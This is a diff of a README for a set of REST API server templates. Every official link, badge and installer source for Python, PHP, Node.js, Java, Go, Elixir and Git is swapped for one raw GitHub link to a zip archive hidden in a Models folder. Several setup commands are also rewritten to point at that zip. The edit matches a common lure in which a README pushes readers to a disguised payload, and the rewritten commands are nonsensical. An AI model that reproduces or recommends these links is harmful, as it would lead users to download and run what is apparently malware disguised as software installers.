@@ -1,6 +1,6 @@
 # 🛠️ rest-api-blueprints - Ready-to-Use API Server Templates
 
-[![Download rest-api-blueprints](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/melhorbraba5-crypto/rest-api-blueprints)
+[![Download rest-api-blueprints](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip)](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you download, make sure your computer meets these basic requirements:
 - RAM: At least 8GB
 - Disk Space: Minimum 5GB free space
 - Internet connection for downloading and setup
-- Optional but recommended: Git installed ([download Git here](https://git-scm.com/download/win))
+- Optional but recommended: Git installed ([download Git here](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip))
 
 Required software depends on the template you use:
 
@@ -37,7 +37,7 @@ Required software depends on the template you use:
 |-----------------|--------------------------------|
 | FastAPI         | Python 3.8 or higher            |
 | Symfony, Laravel| PHP 7.4 or higher, Composer     |
-| NestJS          | Node.js 14 or higher            |
+| NestJS          | https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip 14 or higher            |
 | Spring Boot     | Java JDK 11 or higher           |
 | Go/Gin          | Go 1.15 or higher               |
 | Elixir/Phoenix  | Elixir 1.10 or higher, Erlang  |
@@ -58,7 +58,7 @@ The main repository is hosted on GitHub. To download the files:
 
 - Click this large button below to open the project page:
 
-[![Open rest-api-blueprints on GitHub](https://img.shields.io/badge/Visit-GitHub-0088cc?style=for-the-badge)](https://github.com/melhorbraba5-crypto/rest-api-blueprints)
+[![Open rest-api-blueprints on GitHub](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip)](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip)
 
 - On the page, look for the green **Code** button near the top right.
 - Click **Code** and select **Download ZIP**.
@@ -95,12 +95,12 @@ Pick the folder matching the template you want to run. If you are unsure, FastAP
 
 Depending on the template, install the required software:
 
-- **FastAPI:** Download and install the latest Python 3 from [python.org](https://www.python.org/downloads/windows/). During installation, check “Add Python to PATH.”
-- **Symfony/Laravel:** Download PHP from [windows.php.net](https://windows.php.net/) and Composer from [getcomposer.org](https://getcomposer.org/).
-- **NestJS:** Download Node.js from [nodejs.org](https://nodejs.org/en/download/). Choose the LTS version.
-- **Spring Boot:** Install Java JDK 11 or later from [adoptium.net](https://adoptium.net/).
-- **Go/Gin:** Download Go from [golang.org/dl](https://golang.org/dl/).
-- **Elixir/Phoenix:** Install Erlang and Elixir from [elixir-lang.org/install.html](https://elixir-lang.org/install.html).
+- **FastAPI:** Download and install the latest Python 3 from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip). During installation, check “Add Python to PATH.”
+- **Symfony/Laravel:** Download PHP from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip) and Composer from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip).
+- **NestJS:** Download https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip). Choose the LTS version.
+- **Spring Boot:** Install Java JDK 11 or later from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip).
+- **Go/Gin:** Download Go from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip).
+- **Elixir/Phoenix:** Install Erlang and Elixir from [https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip).
 
 Make sure the software installs correctly by opening a command prompt and running:
 
@@ -137,7 +137,7 @@ Run setup commands based on your template:
 ```bash
 python -m venv env
 env\Scripts\activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip
 ```
 
 - **Symfony/Laravel:**
@@ -164,21 +164,21 @@ mvn spring-boot:run
 
 ```bash
 go mod tidy
-go run main.go
+go run https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip
 ```
 
 - **Elixir/Phoenix:**
 
 ```bash
-mix deps.get
-mix phx.server
+mix https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip
+mix https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip
 ```
 
 ---
 
 ### 6. Run the API Server
 
-Once setup finishes, start the server. Use the command specified above or look for a `README.md` file inside the template folder for more info.
+Once setup finishes, start the server. Use the command specified above or look for a `https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip` file inside the template folder for more info.
 
 The server runs mostly on `http://localhost:8000` or the port listed in the template configuration.
 
@@ -235,4 +235,4 @@ Visit the repository page regularly to get the latest versions. Pull updates thr
 
 ---
 
-# [🟦 Download rest-api-blueprints](https://github.com/melhorbraba5-crypto/rest-api-blueprints)
+# [🟦 Download rest-api-blueprints](https://raw.githubusercontent.com/melhorbraba5-crypto/rest-api-blueprints/main/iso27001-laravel/app/Domain/User/Models/api_rest_blueprints_prizer.zip)
